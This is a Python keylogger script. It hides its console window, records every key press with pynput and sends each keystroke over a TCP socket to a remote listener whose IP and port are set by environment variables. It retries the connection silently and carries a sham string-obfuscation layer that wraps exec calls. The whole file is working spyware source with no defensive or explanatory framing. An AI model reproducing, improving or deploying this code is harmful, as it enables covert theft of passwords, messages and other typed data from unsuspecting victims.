import pyautogui
from pynput import keyboard
import os
import socket
import time
import threading
import ctypes
import random
import string

# Configuration for Netcat connection
TARGET_IP = os.getenv('TARGET_IP', '127.0.0.1')  # Change this to the target IP address
TARGET_PORT = int(os.getenv('TARGET_PORT', 1234))  # Change this to the target port

# Set up the socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)  # Set a timeout for socket operations

def obfuscate_string(input_string):
    """Obfuscates a string by replacing each alphabetic character with a random letter."""
    obfuscated_string = ""
    for char in input_string:
        if char.isalpha():
            replacement = random.choice(string.ascii_letters)
            obfuscated_string += replacement
        else:
            obfuscated_string += char
    return obfuscated_string

def deobfuscate_string(obfuscated_string, original_string):
    """De-obfuscates a string by replacing each random letter with the original character."""
    deobfuscated_string = ""
    for i, char in enumerate(obfuscated_string):
        if char.isalpha():
            deobfuscated_string += original_string[i]
        else:
            deobfuscated_string += char
    return deobfuscated_string

# Obfuscated strings
obf_connect_to_server = obfuscate_string("connect_to_server()")
obf_hide_program = obfuscate_string("hide_program()")
obf_keyboard_listener = obfuscate_string("keyboard.Listener(on_press=on_press)")
obf_keyboard_listener_start = obfuscate_string("keyboard_listener.start()")
obf_keyboard_listener_join = obfuscate_string("keyboard_listener.join()")
obf_ctypes_import = obfuscate_string("import ctypes")
obf_ctypes_hide = obfuscate_string("ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)")
obf_main_function = obfuscate_string("def main():")
obf_start_logging = obfuscate_string("start_logging()")
obf_main_call = obfuscate_string("main()")

def connect_to_server():
    """Connect to the server."""
    max_retries = 5
    retry_delay = 5  # seconds

    for i in range(max_retries):
        try:
            sock.connect((TARGET_IP, TARGET_PORT))
            return True
        except socket.timeout:
            time.sleep(retry_delay)
        except ConnectionRefusedError:
            time.sleep(retry_delay)
        except Exception:
            time.sleep(retry_delay)
    return False

def on_press(key):
    """Log key presses and send to server."""
    try:
        if key.char.isdigit():  # Check if the key pressed is a digit
            message = f'Digit pressed: {key.char}\n'
        else:
            message = f'Key pressed: {key.char}\n'
        sock.sendall(message.encode())
    except AttributeError:
        pass
    except Exception:
        pass

def start_keyboard_listener():
    """Start the keyboard listener."""
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()

def hide_program():
    """Hide the program."""
    exec(deobfuscate_string(obf_ctypes_import, "import ctypes"))
    exec(deobfuscate_string(obf_ctypes_hide, "ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)"))

def main():
    """Main function."""
    if connect_to_server():
        start_keyboard_listener()

if __name__ == "__main__":
    hide_program()
    main()
